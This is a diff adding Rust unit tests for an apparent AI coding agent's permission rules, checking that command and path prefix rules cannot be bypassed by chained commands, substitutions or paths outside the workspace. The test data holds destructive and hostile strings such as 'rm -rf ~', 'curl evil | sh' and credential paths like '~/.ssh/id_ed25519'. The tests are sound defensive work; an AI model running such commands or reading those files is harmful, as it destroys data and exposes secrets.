+        PermissionRule::parse(text).unwrap_or_else(|| panic!("`{text}` should parse"))
+    }
+
+    fn command(text: &str) -> Value {
+        serde_json::json!({ "command": text })
+    }
+
+    // ── matching ───────────────────────────────────────────────────────
+
+    #[test]
+    fn a_prefix_covers_a_longer_invocation() {
+        let rule = rule("bash(command:^cargo test)");
+        assert!(rule.matches("bash", &command("cargo test --lib")));
+        assert!(rule.matches("bash", &command("cargo test -- --nocapture")));
+    }
+
+    #[test]
+    fn a_prefix_is_word_wise_not_string_wise() {
+        let rule = rule("bash(command:^cargo test)");
+        assert!(!rule.matches("bash", &command("cargo testing")));
+        assert!(!rule.matches("bash", &command("cargo build")));
+    }
+
+    /// The hole a glob prefix would have opened. `cargo test *` as a glob
+    /// matches every one of these; a prefix rule must match none.
+    #[test]
+    fn a_prefix_never_covers_a_chained_command() {
+        let rule = rule("bash(command:^cargo test)");
+        for chained in [
+            "cargo test && rm -rf ~",
+            "cargo test; rm -rf ~",
+            "cargo test || rm -rf ~",
+            "cargo test | sh",
+            "cargo test & rm -rf ~",
+            "cargo test\nrm -rf ~",
+        ] {
+            assert!(
+                !rule.matches("bash", &command(chained)),
+                "`{chained}` must not ride on a rule for `cargo test`"
+            );
+        }
+    }
+
+    #[test]
+    fn a_prefix_never_covers_a_substitution() {
+        let rule = rule("bash(command:^cargo test)");
+        for line in ["cargo test $(rm -rf ~)", "cargo test `rm -rf ~`"] {
+            assert!(!rule.matches("bash", &command(line)), "`{line}`");
+        }
+    }
+
+    /// A one-word rule is never *generated* (see `generate_prefix`), but a
+    /// hand-written one must still require every segment to be covered.
+    #[test]
+    fn a_prefix_covers_a_command_only_when_every_segment_matches() {
+        let rule = rule("bash(command:^git)");
+        assert!(rule.matches("bash", &command("git pull")));
+        assert!(rule.matches("bash", &command("git pull; git status")));
+        assert!(!rule.matches("bash", &command("git pull; curl evil | sh")));
+    }
+
+    #[test]
+    fn a_prefix_matches_only_its_own_tool() {
+        let rule = rule("bash(command:^cargo test)");
+        assert!(!rule.matches("write_file", &command("cargo test")));
+    }
+
+    #[test]
+    fn a_prefix_does_not_match_a_non_string_field() {
+        let rule = rule("bash(command:^cargo test)");
+        assert!(!rule.matches("bash", &serde_json::json!({ "command": 7 })));
+        assert!(!rule.matches("bash", &serde_json::json!({})));
+    }
+
+    #[test]
+    fn a_prefix_round_trips_through_its_string_form() {
+        let rule = rule("bash(command:^cargo   test)");
+        assert_eq!(rule.to_rule_string(), "bash(command:^cargo test)");
+        assert!(matches!(
+            PermissionRule::parse(&rule.to_rule_string()),
+            Some(PermissionRule::CommandPrefix { .. })
+        ));
+    }
+
+    // ── the deny interaction this form exists for ──────────────────────
+
+    /// `deny` and `allow` both match the whole command string, so a rule that
+    /// covered only the first segment would let the second through *and* keep
+    /// the `deny` rule naming it from ever matching. Neither rule matches here,
+    /// so the call falls through to a prompt.
+    #[test]
+    fn a_prefix_does_not_pre_empt_a_deny_rule_for_the_second_segment() {
+        let rules = EffectiveRules::from_lists(
+            &["bash(command:^cargo test)".to_string()],
+            &[],
+            &["bash(command:rm -rf *)".to_string()],
+        );
+        assert_eq!(
+            rules.action("bash", &command("cargo test; rm -rf /")),
+            RuleAction::None,
+            "the chained command must fall through to a prompt"
+        );
+        // The rule still does its job on its own...
+        assert_eq!(
+            rules.action("bash", &command("cargo test --lib")),
+            RuleAction::Allow
+        );
+        // ...and a destructive command is still denied outright.
+        assert_eq!(rules.action("bash", &command("rm -rf /")), RuleAction::Deny);
+    }
+
+    // ── generation ─────────────────────────────────────────────────────
+
+    fn generate(line: &str) -> Option<PermissionRule> {
+        PermissionRule::generate_prefix(
+            "bash",
+            PermissionPromptPolicy::Command { field: "command" },
+            &command(line),
+        )
+    }
+
+    #[test]
+    fn generate_takes_the_first_two_words() {
+        let rule = generate("cargo test --lib -- --nocapture").expect("should generate");
+        assert_eq!(rule.to_rule_string(), "bash(command:^cargo test)");
+    }
+
+    #[test]
+    fn generate_refuses_a_single_word_command() {
+        assert!(generate("ls").is_none());
+        assert!(generate("make").is_none());
+    }
+
+    #[test]
+    fn generate_refuses_a_flag_in_second_position() {
+        assert!(generate("git -c core.pager=sh status").is_none());
+        assert!(generate("npm --prefix . run build").is_none());
+    }
+
+    #[test]
+    fn generate_refuses_compound_and_substituted_commands() {
+        for line in [
+            "cargo test && rm -rf ~",
+            "cargo test; cargo build",
+            "cargo test | tee log",
+            "cargo test $(date)",
+            "cargo test `date`",
+        ] {
+            assert!(generate(line).is_none(), "`{line}`");
+        }
+    }
+
+    #[test]
+    fn generate_refuses_runners_and_irreversible_programs() {
+        for line in [
+            "sh -c ls",
+            "bash script.sh",
+            "python3 script.py --flag",
+            "node server.js",
+            "find . -name x",
+            "sed -n 1p file",
+            "awk {print} file",
+            "env FOO=1 cargo test",
+            "xargs rm",
+            "sudo ls /root",
+            "rm -rf build",
+            "chmod 777 file",
+            "tar xzf archive.tgz",
+        ] {
+            assert!(generate(line).is_none(), "`{line}`");
+        }
+    }
+
+    #[test]
+    fn generate_refuses_a_program_that_is_not_a_bare_name() {
+        assert!(generate("./deploy.sh prod").is_none());
+        assert!(generate("/usr/bin/cargo test").is_none());
+        assert!(generate("FOO=1 cargo test").is_none());
+    }
+
+    #[test]
+    fn generate_refuses_a_prompt_with_no_prefix_shape() {
+        // A tool-wide prompt has no narrower form to record, and a patch names
+        // its targets inside its own text rather than in a field.
+        for (tool, policy, input) in [
+            (
+                "search_notes",
+                PermissionPromptPolicy::Json,
+                serde_json::json!({ "query": "x" }),
+            ),
+            (
+                "ask_user",
+                PermissionPromptPolicy::Question { field: "question" },
+                serde_json::json!({ "question": "continue?" }),
+            ),
+            (
+                "apply_patch",
+                PermissionPromptPolicy::PatchTarget {
+                    patch_field: "patch",
+                },
+                serde_json::json!({ "patch": "*** Begin Patch" }),
+            ),
+        ] {
+            assert!(
+                PermissionRule::generate_prefix(tool, policy, &input).is_none(),
+                "{tool} should not offer a prefix rule"
+            );
+        }
+    }
+
+    // ── path prefixes ──────────────────────────────────────────────────
+
+    #[test]
+    fn a_path_prefix_covers_a_folder_component_wise() {
+        let rule = rule("edit_file(path:@src)");
+        assert!(rule.matches("edit_file", &serde_json::json!({"path": "src/lib.rs"})));
+        assert!(rule.matches(
+            "edit_file",
+            &serde_json::json!({"path": "src/adapters/mcp/server.rs"})
+        ));
+        // A sibling directory that merely starts with the same letters.
+        assert!(!rule.matches("edit_file", &serde_json::json!({"path": "srcx/lib.rs"})));
+        // Outside the folder, and outside the workspace.
+        assert!(!rule.matches("edit_file", &serde_json::json!({"path": "docs/readme.md"})));
+        assert!(!rule.matches("edit_file", &serde_json::json!({"path": "../src/lib.rs"})));
+        // `./` is the same location spelled differently.
+        assert!(rule.matches("edit_file", &serde_json::json!({"path": "./src/lib.rs"})));
+    }
+
+    #[test]
+    fn a_path_prefix_round_trips_and_is_not_a_command_prefix() {
+        let rule = rule("edit_file(path:@src/adapters)");
+        assert_eq!(rule.to_rule_string(), "edit_file(path:@src/adapters)");
+        assert!(matches!(
+            PermissionRule::parse(&rule.to_rule_string()),
+            Some(PermissionRule::PathPrefix { .. })
+        ));
+        // The markers are not interchangeable.
+        assert!(matches!(
+            PermissionRule::parse("edit_file(path:^src)"),
+            Some(PermissionRule::CommandPrefix { .. })
+        ));
+    }
+
+    #[test]
+    fn generate_takes_the_parent_folder() {
+        let generated = |path: &str| {
+            PermissionRule::generate_prefix(
+                "edit_file",
+                PermissionPromptPolicy::Path { field: "path" },
+                &serde_json::json!({ "path": path }),
+            )
+        };
+        assert_eq!(
+            generated("docs/usage.md").map(|rule| rule.to_rule_string()),
+            Some("edit_file(path:@docs)".to_string())
+        );
+        assert_eq!(
+            generated("src/adapters/mcp/server.rs").map(|rule| rule.to_rule_string()),
+            Some("edit_file(path:@src/adapters/mcp)".to_string())
+        );
+        assert_eq!(
+            generated("./docs/usage.md").map(|rule| rule.to_rule_string()),
+            Some("edit_file(path:@docs)".to_string())
+        );
+    }
+
+    #[test]
+    fn generate_refuses_paths_that_are_not_a_folder_in_the_workspace() {
+        let generated = |path: &str| {
+            PermissionRule::generate_prefix(
+                "edit_file",
+                PermissionPromptPolicy::Path { field: "path" },
+                &serde_json::json!({ "path": path }),
+            )
+        };
+        // A file at the workspace root: the exact rule already covers it.
+        assert!(generated("README.md").is_none());
+        // The sensitive guard's territory, which a rule must not route around.
+        assert!(generated("/etc/passwd").is_none());
+        assert!(generated("~/.ssh/id_ed25519").is_none());
+        assert!(generated("../elsewhere/file.md").is_none());
+        assert!(generated("docs/../../file.md").is_none());
+        // `.git` runs hooks; `.tact` holds the settings file these rules live in.
+        assert!(generated(".git/config").is_none());
+        assert!(generated(".tact/settings.json").is_none());
+    }
+
+    // ── the delimiter limit, lifted for the token-based forms ──────────
+
+    #[test]
+    fn a_prefix_token_may_contain_a_rule_delimiter() {
+        // The terminator is the final `)`, which `rfind` locates, so a token
+        // holding a paren round-trips here where the glob form cannot.
+        let rule = rule("bash(command:^echo (x))");
+        assert_eq!(rule.to_rule_string(), "bash(command:^echo (x))");
+        assert!(rule.matches("bash", &command("echo (x)")));
+        assert!(rule.matches("bash", &command("echo (x) more")));
+    }
+
+    #[test]
+    fn a_generated_prefix_round_trips_even_when_the_token_holds_a_delimiter() {
+        let generated = generate("cargo test(x)").expect("a two-word command should generate");
+        assert!(matches!(
+            PermissionRule::parse(&generated.to_rule_string()),
+            Some(PermissionRule::CommandPrefix { .. })
+        ));
+        assert!(generated.matches("bash", &command("cargo test(x)")));
+    }
+
+    /// The glob form keeps the restriction — the lifted one is the token-based
+    /// form's alone.
+    #[test]
+    fn the_glob_form_still_refuses_a_pattern_containing_a_paren() {
+        // Note the doubled paren: the pattern has to *contain* a `)` for the
+        // ambiguity to exist, which is exactly the case the check rejects.
+        assert!(PermissionRule::parse("bash(command:cargo test (x))").is_none());
+    }
+
+    #[test]
+    fn a_generated_prefix_matches_the_command_it_came_from() {
+        let rule = generate("cargo test --lib").expect("should generate");
+        assert!(rule.matches("bash", &command("cargo test --lib")));
+        assert!(rule.matches("bash", &command("cargo test --all-targets")));
+        assert!(!rule.matches("bash", &command("cargo build")));
     }
 }
